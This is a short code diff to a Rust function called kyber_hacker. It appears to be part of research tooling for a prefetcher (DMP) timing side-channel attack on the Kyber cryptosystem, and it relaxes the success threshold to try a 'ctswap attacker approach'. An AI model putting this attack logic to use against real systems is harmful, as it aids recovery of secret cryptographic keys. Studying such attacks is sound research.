@@ -380,7 +380,10 @@ fn kyber_hacker(
                     println!("Base mode: {}", median_test_base);
 
                     // only if atk mode activate DMP but base mode does not
-                    if (median_test_atk > pp_threshold) && (median_test_base < pp_threshold) && (median_test_atk as i32 - median_test_base as i32 > 50) {
+                    // if (median_test_atk > pp_threshold) && (median_test_base < pp_threshold) && (median_test_atk as i32 - median_test_base as i32 > 50) {
+                    // Try ctswap attacker approach when median_test_atk does not have to be 
+                    // larger than pp_threshold
+                    if (median_test_base < pp_threshold) && (median_test_atk as i32 - median_test_base as i32 > 50) {
                         succeed_times += 1;
                         noise_times = 0;
                         threshold_v.push((median_test_atk + median_test_base) / 2);
